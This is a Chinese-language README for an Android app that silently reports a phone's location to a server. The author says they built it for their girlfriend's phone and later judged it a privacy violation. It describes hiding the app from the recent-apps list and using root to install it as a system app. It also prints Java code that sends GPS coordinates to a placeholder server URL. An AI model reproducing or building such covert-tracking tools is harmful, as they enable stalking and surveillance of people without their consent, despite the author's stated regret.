# 无论你在哪里，我都会找到你
![图标](./app/src/main/res/mipmap-xxhdpi/heart_watch.png)

学生计划的私有库快到期了，所以直接公开出来吧  
地理位置自动上报的Android应用，原本打算装在女朋友手机里，以使得在联系不到她的时候能够联系上，但是后来仔细一想，这种行为应该也属于侵犯隐私的一种，所以做完后也没使用了。  
只有想到一种解决方案，就是在应用里增加一个获取本人同意的流程，让她明白有这么一个应用，并且这个应用的各个细节都讲清楚。

## 功能简介
通过android自带的获取地理位置的接口，定时向服务器发送自己的经纬度，就这么简单。当然，为了防止被后台误杀，一是做了不显示在最近应用列表中，而是直接通过root权限放到系统应用里面去。主要的程序主体就是这样:

	public class SendLocationThread extends Thread {
		@Override
		public void run(){
			URL url = null;
			try {
				LocationManager locManger = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
				Location loc = locManger.getLastKnownLocation(LocationManager.GPS_PROVIDER);
				if (loc == null) {
					loc = locManger.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
				}
				url = new URL("这里就是服务器地址/location?" +
	                        "latitude=" + loc.getLatitude() +
	                        "&&longitude=" + loc.getLongitude()
	                );
			} catch (MalformedURLException e) {
				e.printStackTrace();
			}
			HttpURLConnection connection = null;
				String result = "";
				try {
					connection = (HttpURLConnection) url.openConnection();
					InputStreamReader in = new InputStreamReader((connection.getInputStream()));
					BufferedReader bufferedReader = new BufferedReader(in);
					StringBuffer strBuffer = new StringBuffer();
					String line = null;
					while ((line = bufferedReader.readLine()) != null) {
						strBuffer.append(line);
					}
					result = strBuffer.toString();
				} catch (IOException e) {
					e.printStackTrace();
				}
	
				Message msg = new Message();
				msg.what = msgKey2;
				Bundle bundle = new Bundle();
				bundle.putString("result", result);
				msg.setData(bundle);
				mHandler.sendMessage(msg);
			}
		}

## Licnese
© 2015-2016 [haofly](https://haofly.net). This code is distributed under the MIT license.


